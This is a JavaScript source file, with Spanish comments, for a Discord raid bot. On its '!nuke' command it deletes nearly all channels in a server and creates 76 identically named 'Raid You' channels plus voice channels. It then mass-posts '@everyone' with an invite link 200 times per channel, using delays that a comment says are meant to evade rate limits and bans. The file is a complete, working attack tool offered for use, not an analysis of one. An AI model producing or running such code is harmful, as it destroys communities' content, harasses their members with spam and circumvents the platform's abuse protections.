require('dotenv').config();  // ← Esto carga el .env

const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const PREFIX = "!";

// Ahora usa la variable de entorno (segura)
const TOKEN = process.env.TOKEN;

const OWNER_ID = "1436516806842912970";

// ... el resto de tu código sigue igual (client.once, client.on, etc.)

client.once('ready', () => {
  console.log(`Bot conectado como ${client.user.tag}`);
  console.log('Usa !nuke SOLO si estás seguro!');
});

client.on('messageCreate', async (message) => {
  if (!message.content.startsWith(PREFIX)) return;
  if (message.author.bot) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === 'nuke') {
    if (message.author.id !== OWNER_ID) {
      return message.reply('Solo el dueño puede usar este comando tan destructivo.');
    }

    await message.reply('⚠️ Iniciando borrado de canales... ¡Esto NO se puede deshacer!').catch(() => {});

    // 1. BORRAR TODOS LOS CANALES POSIBLES
    try {
      const channels = message.guild.channels.cache;
      for (const channel of channels.values()) {
        if (channel.deletable && channel.id !== message.channel.id) {
          await channel.delete().catch(err => console.log(`No se pudo borrar ${channel.name}: ${err}`));
          await new Promise(r => setTimeout(r, 400));
        }
      }
      await message.channel.send('✔️ Canales borrados (excepto este).').catch(() => {});
    } catch (err) {
      console.error(err);
      await message.channel.send('❌ Error al borrar canales...').catch(() => {});
    }

    // 2. CREAR CANALES PERSONALIZADOS + SPAM AUTOMÁTICO
    try {
      // Categoría principal
      const catRaid = await message.guild.channels.create({
        name: '$ by pwy Raid You$',
        type: ChannelType.GuildCategory,
        permissionOverwrites: [
          { id: message.guild.id, allow: [PermissionsBitField.Flags.ViewChannel] }
        ]
      });

      // Lista de nombres de canales de texto (40 como tenías)
      const textChannelNames = [
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$',
        '$ by pwy Raid You$'
      ];

      const createdTextChannels = [];

      for (const name of textChannelNames) {
        try {
          const ch = await message.guild.channels.create({
            name: name,
            type: ChannelType.GuildText,
            parent: catRaid.id,
            topic: 'Raid by pwy'
          });
          createdTextChannels.push(ch);
        } catch (e) {}
        await new Promise(r => setTimeout(r, 300));
      }

      // Categoría de voz
      const catVoz = await message.guild.channels.create({
        name: '$ by pwy Raid You$ VOZ',
        type: ChannelType.GuildCategory
      });

      const voiceChannels = [
        { name: '$ by pwy Raid You$ - Voz 1', limit: 0 },
        { name: '$ by pwy Raid You$ - Voz 2', limit: 99 },
        { name: '$ by pwy Raid You$ - AFK', limit: 99 }
      ];

      for (const vc of voiceChannels) {
        await message.guild.channels.create({
          name: vc.name,
          type: ChannelType.GuildVoice,
          parent: catVoz.id,
          userLimit: vc.limit
        }).catch(() => {});
        await new Promise(r => setTimeout(r, 300));
      }

      // ───────────────────────────────────────────────
      //          SPAM AUTOMÁTICO EN LOS CANALES NUEVOS
      // ───────────────────────────────────────────────
      const spamMessage = '@everyone $ by pwy Raid You$ https://discord.gg/Dv5dauuCJS';
      const timesPerChannel = 200;   // ← Cambia este número si quieres más/menos repeticiones por canal

      let totalSent = 0;

      await message.channel.send('Canales creados. Iniciando spam automático...').catch(() => {});

      for (const channel of createdTextChannels) {
        if (!channel) continue;

        for (let i = 0; i < timesPerChannel; i++) {
          try {
            await channel.send(spamMessage);
            totalSent++;
            await new Promise(r => setTimeout(r, 800)); // delay para evitar rate-limit/ban rápido
          } catch (sendErr) {
            console.log(`Fallo spam en ${channel.name}: ${sendErr}`);
          }
        }
        await new Promise(r => setTimeout(r, 2000)); // pausa entre canales
      }

      await message.channel.send(`$ by pwy Raid You$ accept - Spam completado (${totalSent} mensajes enviados) 🔥`).catch(() => {});

    } catch (err) {
      console.error(err);
      await message.channel.send('$ by pwy Raid You$ cancel - Error en creación/spam').catch(() => {});
    }
  }
});

client.login(TOKEN);